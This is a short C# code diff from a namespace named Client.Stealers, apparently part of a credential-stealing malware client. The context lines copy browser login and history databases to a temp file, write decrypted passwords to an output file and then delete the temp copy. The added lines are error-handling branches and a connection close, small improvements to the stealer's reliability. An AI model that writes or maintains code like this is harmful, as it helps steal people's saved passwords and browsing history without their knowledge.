@@ -181,6 +181,10 @@ namespace Client.Stealers
 
                                     conn.Close();
                                 }
+                                else
+                                {
+                                    decryptPasswordFile.WriteLine("No history found or unable to connect to the database.");
+                                }
                             }
                             // Delete temp login db
                             File.Delete("TempVault.db");
@@ -242,6 +246,10 @@ namespace Client.Stealers
                                     }
                                     conn.Close();
                                 }
+                                else
+                                {
+                                    decryptPasswordFile.WriteLine("No history found or unable to connect to the database.");
+                                }
                             }
                             // Delete temp login db
                             File.Delete("TempVault.db");
@@ -298,6 +306,11 @@ namespace Client.Stealers
                                             }
                                         }
                                     }
+                                    conn.Close();
+                                }
+                                else
+                                {
+                                    historyFile.WriteLine("No history found or unable to connect to the database.");
                                 }
                             }
                             // Delete temp history db
